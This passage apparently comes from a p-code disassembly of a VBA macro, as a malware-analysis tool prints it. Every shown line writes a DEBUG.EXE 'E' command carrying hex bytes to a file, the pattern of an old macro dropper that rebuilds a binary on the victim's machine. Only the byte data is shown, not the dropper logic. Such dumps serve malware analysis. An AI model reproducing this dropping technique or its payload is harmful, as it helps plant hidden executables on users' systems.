' 	PrintItemNL 
' Line #547:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1610 00 00 F4 F7 F5 EC EF ED E0 E2 E2 CF D1 D1 BD C1"
' 	PrintItemNL 
' Line #548:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1620 C2 B5 B9 BA 00 03 06 5F 64 67 61 67 6C 50 56 5B"
' 	PrintItemNL 
' Line #549:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1630 49 51 58 53 5B 62 55 5E 67 51 5A 63 53 5C 65 59"
' 	PrintItemNL 
' Line #550:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1640 62 6B 24 CB C8 09 F7 EF 47 89 8E 60 69 72 5C 65"
' 	PrintItemNL 
' Line #551:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1650 6E 4A 53 5C 4C 55 5E 6B 74 7D 64 6D 76 56 5F 68"
' 	PrintItemNL 
' Line #552:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1660 5C 65 6E 5E 67 70 5B 73 7B 09 F7 EF 09 F7 EF 09"
' 	PrintItemNL 
' Line #553:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1670 F7 EF 09 F7 EF 28 C1 BF 65 6E 77 5D 68 70 4B 55"
' 	PrintItemNL 
' Line #554:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1680 5F 4A 59 62 56 68 6F 55 68 6F 5F 73 78 59 6A 6D"
' 	PrintItemNL 
' Line #555:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1690 58 64 68 48 50 50 10 0F 11 0E 44 42 09 F7 EF 19"
' 	PrintItemNL 
' Line #556:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 16A0 88 85 1E 11 0F 14 08 08 18 0A 0E 12 09 0C 12 0B"
' 	PrintItemNL 
' Line #557:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 16B0 0E 18 16 16 00 00 00 98 98 98 FF FE FF FF FA FC"
' 	PrintItemNL 
' Line #558:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 16C0 FF FB FE FF FD FF FE FA FF FA FC FF E3 EB FF 5A"
' 	PrintItemNL 
' Line #559:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 16D0 65 85 29 8A A1 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #560:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 16E0 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 33 F5 F0"
' 	PrintItemNL 
' Line #561:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 16F0 E1 EF F7 E4 E3 EC EF EF F5 CE CD D1 16 10 15 05"
' 	PrintItemNL 
' Line #562:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1700 00 03 0A CC C5 09 F7 EF 07 BA B5 36 39 3D 69 6F"
' 	PrintItemNL 
' Line #563:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1710 74 59 64 68 4B 57 5D 48 56 5C 4F 5D 63 52 60 66"
' 	PrintItemNL 
' Line #564:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1720 12 D6 D0 09 F7 EF 39 78 78 25 29 2A 2B 2A 2C 08"
' 	PrintItemNL 
' Line #565:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1730 0A 0A 00 02 00 28 31 2E 0D ED E6 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #566:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1740 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #567:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1750 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09"
' 	PrintItemNL 
' Line #568:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1760 F7 EF 0B EC E4 2F 5F 5F 42 47 48 3F 44 45 34 39"
' 	PrintItemNL 
' Line #569:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1770 3A 00 00 01 00 00 F4 F7 F5 EC EF ED E0 E2 E2 CF"
' 	PrintItemNL 
' Line #570:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1780 D1 D1 BD C1 C2 B5 B9 BA 00 03 06 5F 64 67 55 5B"
' 	PrintItemNL 
' Line #571:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1790 60 52 58 5D 50 58 5F 56 5E 65 5B 64 6D 5E 67 70"
' 	PrintItemNL 
' Line #572:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 17A0 62 6B 74 63 7A 82 09 F7 EF 09 F7 EF 21 C8 C6 61"
' 	PrintItemNL 
' Line #573:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 17B0 6A 73 5C 65 6E 4A 53 5C 51 5A 63 6A 73 7C 5E 67"
' 	PrintItemNL 
' Line #574:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 17C0 70 51 5A 63 56 5F 68 5B 64 6D 42 93 96 09 F7 EF"
' 	PrintItemNL 
' Line #575:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 17D0 09 F7 EF 09 F7 EF 09 F7 EF 0E EF E8 68 71 7A 5E"
' 	PrintItemNL 
' Line #576:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 17E0 69 71 4A 54 5E 4B 5A 63 55 67 6E 4F 61 68 5D 70"
' 	PrintItemNL 
' Line #577:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 17F0 75 58 67 6A 55 60 64 3F 44 45 0D 0A 0C 11 46 45"
' 	PrintItemNL 
' Line #578:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1800 09 F7 EF 10 BF BA 20 13 11 28 1C 1C 1E 11 13 15"
' 	PrintItemNL 
' Line #579:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1810 0A 0D 22 19 1C 04 00 01 1D 1A 1C F4 F3 F5 FF FB"
' 	PrintItemNL 
' Line #580:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1820 FF FF FE FF FF FF FE E0 FD FB FC FD FF F6 FC FF"
' 	PrintItemNL 
' Line #581:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1830 C1 CC E8 56 63 89 22 CA D3 09 F7 EF 09 F7 EF 09"
' 	PrintItemNL 
' Line #582:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1840 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #583:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1850 EF 09 F7 EF 5D F3 F2 DF E1 E9 EA EA F0 D6 D4 DA"
' 	PrintItemNL 
' Line #584:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1860 27 23 29 04 00 04 09 F7 EF 09 F7 EF 07 BA B5 1C"
' 	PrintItemNL 
' Line #585:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1870 1D 21 64 68 6D 64 6D 71 56 60 67 5A 66 6C 46 54"
' 	PrintItemNL 
' Line #586:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1880 5A 37 99 9A 09 F7 EF 09 F7 EF 1D C4 BF 2A 2E 2F"
' 	PrintItemNL 
' Line #587:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1890 1A 1C 1D 27 29 29 00 02 00 0D 41 3D 09 F7 EF 09"
' 	PrintItemNL 
' Line #588:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 18A0 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #589:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 18B0 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #590:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 18C0 09 F7 EF 09 F7 EF 09 F7 EF 1F 9B 97 3F 47 47 3C"
' 	PrintItemNL 
' Line #591:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 18D0 44 44 31 39 39 00 01 01 00 00 F4 F7 F5 EC EF ED"
' 	PrintItemNL 
' Line #592:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 18E0 DF E1 E1 CF D1 D1 BE C2 C3 B6 BA BB 00 02 05 5C"
' 	PrintItemNL 
' Line #593:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 18F0 61 64 45 4B 50 59 5F 64 5B 63 6A 4E 56 5D 4D 56"
' 	PrintItemNL 
' Line #594:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1900 5F 5B 64 6D 61 6A 73 44 95 98 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #595:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1910 09 F7 EF 5D 66 6F 57 60 69 4B 54 5D 5B 64 6D 68"
' 	PrintItemNL 
' Line #596:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1920 71 7A 61 6A 73 59 62 6B 5E 67 70 5E 67 70 2A B5"
' 	PrintItemNL 
' Line #597:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1930 B4 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #598:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1940 45 96 9A 5E 69 71 58 62 6C 62 6E 78 66 76 7D 54"
' 	PrintItemNL 
' Line #599:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1950 66 6D 61 71 77 59 68 6B 55 60 64 37 3C 3D 08 05"
' 	PrintItemNL 
' Line #600:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1960 07 13 48 47 09 F7 EF 10 BF B9 23 16 14 25 17 18"
' 	PrintItemNL 
' Line #601:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1970 1F 13 13 27 1C 1E 2D 24 27 04 00 01 9C 98 9D FF"
' 	PrintItemNL 
' Line #602:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1980 FE FF FF FC FF FF FF FF E0 FD F9 17 F7 EF EC FD"
' 	PrintItemNL 
' Line #603:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1990 FE EF F6 FF 97 A2 C2 5B 68 94 0F EF EB 09 F7 EF"
' 	PrintItemNL 
' Line #604:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 19A0 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09"
' 	PrintItemNL 
' Line #605:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 19B0 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 82 EB ED E0 DF"
' 	PrintItemNL 
' Line #606:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 19C0 E8 D7 D4 DD 40 3B 44 04 00 06 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #607:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 19D0 07 BA B5 07 08 0C 53 57 5C 66 6F 73 5D 67 6E 60"
' 	PrintItemNL 
' Line #608:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 19E0 6C 72 47 53 59 11 E4 DD 09 F7 EF 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #609:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 19F0 EF 34 39 3C 14 18 19 34 38 39 06 0C 0B 04 6E 69"
' 	PrintItemNL 
' Line #610:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1A00 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09"
' 	PrintItemNL 
' Line #611:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1A10 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #612:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1A20 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 22 9D 99"
' 	PrintItemNL 
' Line #613:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1A30 40 48 48 40 48 48 37 3F 3F 00 02 02 00 00 F4 F7"
' 	PrintItemNL 
' Line #614:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1A40 F5 EB EE EC DE E0 E0 CE D0 D0 BF C3 C4 B6 BA BB"
' 	PrintItemNL 
' Line #615:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1A50 00 00 03 58 5D 60 4D 53 58 5D 63 68 58 60 67 4A"
' 	PrintItemNL 
' Line #616:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1A60 52 59 49 52 5B 51 5A 63 53 5C 65 2D A9 AA 09 F7"
' 	PrintItemNL 
' Line #617:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1A70 EF 09 F7 EF 09 F7 EF 4A 8D 91 58 61 6A 52 5B 64"
' 	PrintItemNL 
' Line #618:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1A80 63 6C 75 5E 67 70 5B 64 6D 5B 64 6D 63 6C 75 5D"
' 	PrintItemNL 
' Line #619:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1A90 66 6F 1A D0 CC 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #620:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1AA0 EF 09 F7 EF 30 BA B9 5E 69 71 57 61 6B 5F 6B 75"
' 	PrintItemNL 
' Line #621:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1AB0 67 77 7E 60 70 77 62 70 76 5A 66 6A 56 5F 63 31"
' 	PrintItemNL 
' Line #622:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1AC0 35 36 05 02 04 15 4B 4A 09 F7 EF 0F BF B9 1F 11"
' 	PrintItemNL 
' Line #623:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1AD0 12 20 12 13 26 18 19 2C 20 20 07 00 00 1D 17 1C"
' 	PrintItemNL 
' Line #624:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1AE0 F0 EC F2 FC FA FF FE FA FF FE FC FC 9C F6 EF 09"
' 	PrintItemNL 
' Line #625:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1AF0 F7 EF 9E FB F9 E5 EE FF 77 84 AA 52 8C B1 09 F7"
' 	PrintItemNL 
' Line #626:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1B00 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #627:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1B10 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 16"
' 	PrintItemNL 
' Line #628:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1B20 F6 EF BC D9 E1 D4 D0 DB 57 53 5E 02 00 06 09 F7"
' 	PrintItemNL 
' Line #629:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1B30 EF 09 F7 EF 09 BC B6 00 00 01 41 44 48 63 69 6E"
' 	PrintItemNL 
' Line #630:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1B40 5E 66 6D 53 5F 65 3D 81 84 09 F7 EF 09 F7 EF 09"
' 	PrintItemNL 
' Line #631:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1B50 F7 EF 09 F7 EF 44 49 4C 23 26 2A 27 2B 2C 1E 24"
' 	PrintItemNL 
' Line #632:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1B60 23 04 7D 78 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #633:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1B70 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09"
' 	PrintItemNL 
' Line #634:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1B80 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #635:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1B90 EF 26 94 90 3C 46 46 41 4B 4B 39 43 43 00 03 03"
' 	PrintItemNL 
' Line #636:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1BA0 00 00 F5 F8 F6 EA ED EB DD DF DF CE D0 D0 C0 C4"
' 	PrintItemNL 
' Line #637:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1BB0 C5 B7 BB BC 00 00 03 55 5A 5D 61 67 6C 5A 60 65"
' 	PrintItemNL 
' Line #638:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1BC0 4F 57 5E 52 5A 61 59 62 6B 54 5D 66 50 59 62 26"
' 	PrintItemNL 
' Line #639:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1BD0 BF BE 09 F7 EF 09 F7 EF 09 F7 EF 31 AD AE 50 59"
' 	PrintItemNL 
' Line #640:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1BE0 62 53 5C 65 6C 75 7E 5E 67 70 56 5F 68 5D 66 6F"
' 	PrintItemNL 
' Line #641:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1BF0 6A 73 7C 66 6F 78 0E EE E7 09 F7 EF 09 F7 EF 09"
' 	PrintItemNL 
' Line #642:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1C00 F7 EF 09 F7 EF 09 F7 EF 21 D7 D3 65 70 78 5E 68"
' 	PrintItemNL 
' Line #643:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1C10 72 61 6D 77 66 76 7D 63 70 78 60 6E 74 58 63 67"
' 	PrintItemNL 
' Line #644:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1C20 55 5B 60 2E 30 31 05 00 02 18 4E 4C 09 F7 EF 0B"
' 	PrintItemNL 
' Line #645:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1C30 EA E3 23 15 16 2B 1D 1E 20 13 11 25 19 17 07 00"
' 	PrintItemNL 
' Line #646:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1C40 00 81 7B 80 FF FC FF FF FC FF FF FD FF FF FE FD"
' 	PrintItemNL 
' Line #647:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1C50 81 F8 F1 09 F7 EF 7D F8 F7 DF E9 FF 6B 7B A5 48"
' 	PrintItemNL 
' Line #648:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1C60 AC CB 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #649:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1C70 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #650:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1C80 09 F7 EF 09 F7 EF 47 EA E8 D1 CD D8 67 63 6F 03"
' 	PrintItemNL 
' Line #651:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1C90 00 0A 09 F7 EF 09 F7 EF 0A BD B7 00 00 01 30 33"
' 	PrintItemNL 
' Line #652:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1CA0 37 5F 66 69 60 69 6D 4F 59 60 24 BE BB 09 F7 EF"
' 	PrintItemNL 
' Line #653:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1CB0 09 F7 EF 09 F7 EF 0C EC E5 47 4E 51 30 35 38 16"
' 	PrintItemNL 
' Line #654:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1CC0 1B 1C 2F 37 36 04 7D 78 09 F7 EF 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #655:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1CD0 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #656:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1CE0 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09"
' 	PrintItemNL 
' Line #657:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1CF0 F7 EF 09 F7 EF 34 5A 59 38 42 42 41 4B 4B 3A 44"
' 	PrintItemNL 
' Line #658:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1D00 44 00 01 01 00 00 F7 FA F8 ED F0 EE DE E0 E0 D0"
' 	PrintItemNL 
' Line #659:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1D10 D2 D2 C1 C5 C6 B2 B6 B7 00 00 03 66 6B 6E 5F 65"
' 	PrintItemNL 
' Line #660:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1D20 6A 4A 50 55 51 59 60 59 61 68 44 4D 56 45 4E 57"
' 	PrintItemNL 
' Line #661:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1D30 59 62 6B 1E D3 D0 09 F7 EF 09 F7 EF 09 F7 EF 23"
' 	PrintItemNL 
' Line #662:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1D40 CA C7 39 42 4B 5A 63 6C 6A 73 7C 58 61 6A 63 6C"
' 	PrintItemNL 
' Line #663:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1D50 75 5E 67 70 5F 68 71 60 69 72 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #664:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1D60 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 5F"
' 	PrintItemNL 
' Line #665:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1D70 6A 72 67 71 7B 70 7C 86 62 6F 77 59 66 6E 57 63"
' 	PrintItemNL 
' Line #666:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1D80 69 5E 67 6B 63 67 6C 16 15 17 0A 05 07 19 4E 4D"
' 	PrintItemNL 
' Line #667:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1D90 09 F7 EF 09 F7 EF 24 17 19 19 0C 0E 2F 23 21 0D"
' 	PrintItemNL 
' Line #668:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1DA0 04 01 10 08 09 EA E5 E7 FF FB FF FF FC FF FF FE"
' 	PrintItemNL 
' Line #669:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1DB0 FF FF FF FE 44 F8 F0 09 F7 EF 7E FA F7 AD B9 D5"
' 	PrintItemNL 
' Line #670:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1DC0 6F 7F AD 3E BF D6 09 F7 EF 09 F7 EF 09 F7 EF 09"
' 	PrintItemNL 
' Line #671:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1DD0 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #672:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1DE0 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 9A D3 D9"
' 	PrintItemNL 
' Line #673:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1DF0 87 85 91 06 02 0D 09 F7 EF 09 F7 EF 0A BC B6 00"
' 	PrintItemNL 
' Line #674:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1E00 00 01 03 06 0A 5E 65 68 69 72 76 61 89 8B 09 F7"
' 	PrintItemNL 
' Line #675:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1E10 EF 09 F7 EF 09 F7 EF 09 F7 EF 14 C9 C4 47 4D 52"
' 	PrintItemNL 
' Line #676:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1E20 44 4A 4F 1A 21 24 29 31 30 19 95 8F 09 F7 EF 09"
' 	PrintItemNL 
' Line #677:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1E30 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #678:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1E40 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #679:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1E50 09 F7 EF 0D ED E6 28 88 85 3D 47 47 33 3D 3D 31"
' 	PrintItemNL 
' Line #680:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1E60 3B 3B 3E 48 48 00 01 01 00 00 F4 F7 F5 EA ED EB"
' 	PrintItemNL 
' Line #681:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1E70 DC DE DE CF D1 D1 C2 C6 C7 B4 B8 B9 00 02 05 6A"
' 	PrintItemNL 
' Line #682:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1E80 6F 72 56 5C 61 52 58 5D 5B 63 6A 4C 54 5B 42 4B"
' 	PrintItemNL 
' Line #683:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1E90 54 5E 67 70 68 71 7A 09 F7 EF 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
